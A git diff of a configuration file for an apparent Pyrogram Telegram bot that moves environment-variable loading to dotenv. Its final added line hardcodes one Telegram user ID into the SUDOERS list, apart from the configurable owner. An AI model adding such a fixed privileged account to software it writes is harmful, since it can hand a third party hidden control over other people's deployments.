@@ -1,21 +1,15 @@
-
-# --------------M----------------------------------
-
-import os
 from os import getenv
-# ---------------R---------------------------------
-API_ID = int(os.environ.get("API_ID"))
-# ------------------------------------------------
-API_HASH = os.environ.get("API_HASH")
-# ----------------D--------------------------------
-BOT_TOKEN = os.environ.get("BOT_TOKEN")
-# -----------------A-------------------------------
-BOT_USERNAME = os.environ.get("BOT_USERNAME")
-# ------------------X------------------------------
-OWNER_ID = int(os.environ.get("OWNER_ID"))
-# ------------------X------------------------------
-# ------------------------------------------------
-LOGGER_ID = int(os.environ.get("LOGGER_ID"))
-# ------------------------------------------------
-MONGO_URL = os.environ.get("MONGO_URL")
-# ------------------------------------------------
+from dotenv import load_dotenv
+from pyrogram import filters
+
+load_dotenv()
+
+API_ID = int(getenv("API_ID"))
+API_HASH = getenv("API_HASH")
+BOT_TOKEN = getenv("BOT_TOKEN")
+BOT_USERNAME = getenv("BOT_USERNAME")
+OWNER_ID = int(getenv("OWNER_ID"))
+LOGGER_ID = int(getenv("LOGGER_ID"))
+MONGO_URL = getenv("MONGO_URL")
+
+SUDOERS = filters.user([7044783841])
